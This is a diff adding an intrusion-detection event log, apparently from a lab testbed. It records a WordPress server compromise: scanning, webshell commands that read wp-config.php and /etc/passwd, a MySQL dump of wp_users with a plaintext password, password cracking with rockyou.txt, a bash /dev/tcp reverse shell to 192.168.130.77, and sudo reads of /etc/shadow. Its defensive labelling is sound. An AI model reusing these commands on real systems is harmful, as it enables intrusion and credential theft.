@@ -1,0 +1,28 @@
+2022-01-18T12:17:43+00:00 [RECON: scanner_detected] (source: apache2\access.log) Suspicious scan tool detected from 172.17.130.196 → UA: "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2022-01-18T12:17:50+00:00 [RECON: scanner_detected] (source: apache2\access.log) Suspicious scan activity detected from 172.17.130.196, UA: "WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)"
+2022-01-18T12:37:49+00:00 [RECON: dirb_scan] (source: apache2\access.log) 404 response detected from 172.17.130.196
+2022-01-18T12:38:01+00:00 [RECON: webshell_upload_seq] webshell upload sequences detected from 172.17.130.196
+2022-01-18T12:38:04+00:00 [EXPLOIT: webshell_sysinfo] (source: apache2\access.log) Suspicious PHP request executing ["id", ] from 172.17.130.196
+2022-01-18T12:38:06+00:00 [EXPLOIT: webshell_network_conf] (source: apache2\access.log) Suspicious PHP request executing ["netstat", "-t"] from 172.17.130.196
+2022-01-18T12:38:08+00:00 [EXPLOIT: webshell_file_read] (source: apache2\access.log) Suspicious PHP request executing ["cat", "/etc/resolv.conf"] from 172.17.130.196
+2022-01-18T12:38:09+00:00 [EXPLOIT: webshell_network_conf] (source: apache2\access.log) Suspicious PHP request executing ["ip", "addr"] from 172.17.130.196
+2022-01-18T12:38:11+00:00 [EXPLOIT: webshell_process_command] (source: apache2\access.log) Suspicious PHP request executing ["ps", "-A"] from 172.17.130.196
+2022-01-18T12:38:14+00:00 [EXPLOIT: webshell_sysinfo] (source: apache2\access.log) Suspicious PHP request executing ["lsb_release", "-a"] from 172.17.130.196
+2022-01-18T12:38:16+00:00 [EXPLOIT: webshell_file_read] (source: apache2\access.log) Suspicious PHP request executing ["cat", "/etc/group"] from 172.17.130.196
+2022-01-18T12:38:17+00:00 [EXPLOIT: webshell_file_read] (source: apache2\access.log) Suspicious PHP request executing ["cat", "/etc/passwd"] from 172.17.130.196
+2022-01-18T12:38:19+00:00 [EXPLOIT: webshell_sysinfo] (source: apache2\access.log) Suspicious PHP request executing ["date", ] from 172.17.130.196
+2022-01-18T12:38:21+00:00 [EXPLOIT: webshell_file_command] (source: apache2\access.log) Suspicious PHP request executing ["ls", "-laR", "/var/www"] from 172.17.130.196
+2022-01-18T12:38:23+00:00 [EXPLOIT: webshell_file_read] (source: apache2\access.log) Suspicious PHP request executing ["cat", "/var/www/intranet.price.fox.org/wp-config.php"] from 172.17.130.196
+2022-01-18T12:38:25+00:00 [EXPLOIT: webshell_database] (source: apache2\access.log) Suspicious PHP request executing ["mysql", "-u", "wordpress", "-ptainoox3aedeeSh", "wordpress_db", "-e", "\"select * from wp_users\""] from 172.17.130.196
+2022-01-18T12:38:27+00:00 [EXPLOIT: webshell_file_read] (source: apache2\access.log) Suspicious PHP request executing ["cat", "/etc/profile"] from 172.17.130.196
+2022-01-18T12:38:29+00:00 [EXPLOIT: webshell_file_download] (source: apache2\access.log) Suspicious PHP request executing ["wget", "https://github.com/ait-aecid/wphashcrack/archive/refs/tags/v0.1.tar.gz"] from 172.17.130.196
+2022-01-18T12:39:03+00:00 [EXPLOIT: webshell_file_compress_decompress] (source: apache2\access.log) Suspicious PHP request executing ["tar", "xvfz", "v0.1.tar.gz"] from 172.17.130.196
+2022-01-18T12:39:06+00:00 [EXPLOIT: webshell_file_download] (source: apache2\access.log) Suspicious PHP request executing ["wget", "http://192.168.130.77/rockyou.txt"] from 172.17.130.196
+2022-01-18T12:39:11+00:00 [PRIV_ESC: webshell_shell_exec] (source: apache2\access.log) Suspicious PHP request executing ["./wphashcrack-0.1/wphashcrack.sh", "-w", "$PWD/rockyou.txt", "-j", "./wphashcrack-0.1/john-1.7.6-jumbo-12-Linux64/run", "-u", "phopkins"] from 172.17.130.196
+2022-01-18T13:14:18+00:00 [PRIV_ESC: webshell_shell_exec] (source: apache2\access.log) Suspicious PHP request executing ["bash", "-c", " '0<&196;exec 196<>/dev/tcp/192.168.130.77/51898; sh <&196 >&196 2>&196'", "&"] from 172.17.130.196
+2022-01-18T13:14:31+00:00 [PRIV_ESC: sys_user_session] (source: syslog) Systemd user session event detected: "Created slice User Slice of phopkins."
+2022-01-18T13:14:31+00:00 [PRIV_ESC: sys_user_session] (source: auth.log) Systemd new session opened for user phopkins.
+2022-01-18T13:14:31+00:00 [PRIV_ESC: sys_user_session] (source: syslog) Systemd user session event detected: "Started Session c1 of user phopkins."
+2022-01-18T13:14:41+00:00 [PRIV_ESC: sys_sudo_exec] (source: auth.log) User phopkins executed "list" as root in /var/www/intranet.price.fox.org/wp-content/uploads/2022/01
+2022-01-18T13:14:43+00:00 [PRIV_ESC: sys_sudo_exec] (source: auth.log) User phopkins executed "/bin/ls -laR /root/" as root in /var/www/intranet.price.fox.org/wp-content/uploads/2022/01
+2022-01-18T13:14:49+00:00 [PRIV_ESC: sys_sudo_exec] (source: auth.log) User phopkins executed "/bin/cat /etc/shadow" as root in /var/www/intranet.price.fox.org/wp-content/uploads/2022/01
